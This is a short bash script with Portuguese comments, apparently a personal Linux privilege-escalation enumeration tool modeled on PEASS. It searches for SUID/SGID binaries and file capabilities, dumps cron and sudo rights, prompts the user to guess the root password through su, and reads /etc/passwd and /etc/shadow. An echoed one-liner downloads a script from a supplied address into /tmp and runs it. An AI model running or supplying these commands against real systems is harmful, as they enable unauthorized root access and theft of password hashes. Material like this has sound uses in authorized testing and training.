#!/bin/bash
# TODO
# enumera linux
# Privilege Escalation Awesome Scripts SUITE (PEASS)


echo 'cd /tmp && echo wget "$(read -p "Type address")" -O "kkpeas.sh" && chmod +x kkpeas.sh && ./kkpeas.sh | tee -a kkpeas.log'

set_colors(){
	cred="\e[31m"
	cgreen="\e[32m"
	cyellow="\e[33m"
	cblue="\e[34m"
	cpurp="\e[35m"
	cwhite="\e[36m"
	creset="\e[0m"
}
set_colors

centerPrint (){
	local color1=${3:-cblue}
	local color2=${4:-cwhite}
	local text=${1:-"STEP"}
	local char=${2:-"."}
	width=$(tput cols)
	width_sides=$(( ( $width - ${#text} )/2 - 1))
	printf -v side "%*s" "$(( $width_sides/${#char} ))" ""; side=${side// /"$char"};
	printf "%b %b %b\n" "${!color1}$side$def" "${!color2}${text}${creset}" "${!color1}$side$creset"
}

search_suid () {
    centerPrint "$FUNCNAME" "#"
    # Busca com SUID e SGID
    # find / \( -perm /4000 \) -user root -type f -exec ls -l {} \; 2>/dev/null
    set -x
    find / \( -perm /4000 -o -perm /2000 \) -user root -type f -exec ls -l {} \; 2>/dev/null # só serve se o grupo do usuário for relevante
    set +x
}

search_capabilities (){
    centerPrint "$FUNCNAME" "#"
    set -x
    # find / -type f -exec getcap {} + 2> /dev/null | grep "cap_setuid" 2> /dev/null # mais rápido
    getcap -r / 2> /dev/null # procura por todos os tipos de capabilities
    set +x
}

search_cron (){
    set -x
    centerPrint "$FUNCNAME" "#"
    cat /etc/crontab
    crontab -l
    set +x
}

search_sudo (){
    centerPrint "$FUNCNAME" "#"
    set -x
    sudo --version
    sudo -l
    echo "Tente alguma senha para o root"
    su -
    set +x
}

search_passwd (){
    centerPrint "$FUNCNAME" "#"
    set -x
    ls -lah /etc/passwd
    ls -lah /etc/shadow
    ls -lah /etc/group

    cat /etc/passwd
    cat /etc/shadow
    set +x
}

search_suid
search_capabilities
search_cron
search_sudo
search_passwd